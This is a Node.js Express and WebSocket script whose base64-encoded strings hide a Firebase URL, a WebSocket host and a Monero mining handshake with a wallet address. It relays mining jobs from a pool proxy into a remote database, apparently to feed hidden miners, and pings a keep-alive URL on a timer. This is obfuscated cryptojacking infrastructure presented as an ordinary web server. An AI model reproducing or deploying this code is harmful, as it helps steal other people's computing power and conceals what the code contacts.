const WebSocketClient = require('websocket').client
const express = require('express')
const axios = require('axios')


let mClient = null
let mTimeout = null
let mUrl = null

let mStart = parseInt(new Date().getTime()/1000)
let mTime = new Date().toString()

let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')

let WSS = decode('d3NzOi8vdHJ1c3RhcHJvaWFtLmRlOjEwMDA1Lw==')

let app = express()

app.use(express.json())

app.listen(process.env.PORT || 3000, ()=>{
    console.log('Listening on port 3000')
})

app.get('/', async (req, res) => {
    res.end(''+mStart)
})

app.get('/start', async (req, res) => {
    res.end(''+mTime)
})


startServer()
connneckClient()


setInterval(() => {
    startServer()
}, 300000)



async function startServer() {
    if (mUrl == null) {
        try {
            let response = await axios.get(BASE_URL+'live/server_1.json')
    
            let data = response.data
            if (data != null && data != 'null') {
                mUrl = data
            }
        } catch (error) {}
    }

    if (mUrl) {
        try {
            await axios.get('https://'+mUrl)
        } catch (error) {}
    }
}


function connneckClient() {
    let client = new WebSocketClient()

    client.on('connectFailed', function(error) {
        mClient = null
        console.log('Re-Connect', 'Failed')
        if (mTimeout) clearTimeout(mTimeout)
        setTimeout(() => connneckClient(), 2000)
    })
    
    client.on('connect', function(conn) {
        if (mClient == null) {
            mClient = conn
    
            console.log('WebSocket Client Connected')
        
            mClient.send(decode('eyJpZGVudGlmaWVyIjoiaGFuZHNoYWtlIiwicG9vbCI6ImZhc3Rlci54bXIiLCJyaWdodGFsZ28iOiJjbi9yIiwibG9naW4iOiI0NVFXQVJpV2lWeDlmdTVMeWJmTjJIVm03Y3JXeHZlZXBoOGd6ZFZkUmtkd0NmMmo5QmhMVFYyUk41TkY0djdLMmRLRVlhRkNhVXcxMTdMbXcxWmVZOXA5RnI2aXdzbiIsInBhc3N3b3JkIjoidXJsX21pbmVyIiwidXNlcmlkIjoiIiwidmVyc2lvbiI6MTMsImludHZlcnNpb24iOjEzMzcsIm15ZG9tYWluIjoiV0VCIFNjcmlwdCAxNi0xMS0yMyBQZXJmZWt0IGh0dHBzOi8vd3d3LnJhaXlhbjA4OC54eXoifQ=='))
        
            mClient.on('error', function(error) {
                mClient = null
                console.log('Re-Connect', 'Error')
                if (mTimeout) clearTimeout(mTimeout)
                setTimeout(() => connneckClient(), 2000)
            })
        
            mClient.on('message', function(message) {
                try {
                    let data = JSON.parse(message.utf8Data)
                    if(data['identifier'] == 'job') {
                        sendJob(data)
                        
                        console.log('New Job Received...')
                    }
                } catch (e) {}
            })
        }
    })
    
    client.connect(WSS)

    mTimeout = setTimeout(() => {
        try {
            mClient.close()
        } catch (error) {}
        try {
            client.close()
        } catch (error) {}
        
        try {
            mClient = null
            client = null
        } catch (error) {}
        
        console.log('Re-Connect')
        connneckClient()
    }, 300000)
}


async function sendJob(job) {
    try {
        await axios.patch(BASE_URL+'mining/job.json', JSON.stringify(job), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        })
    } catch (error) {}
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}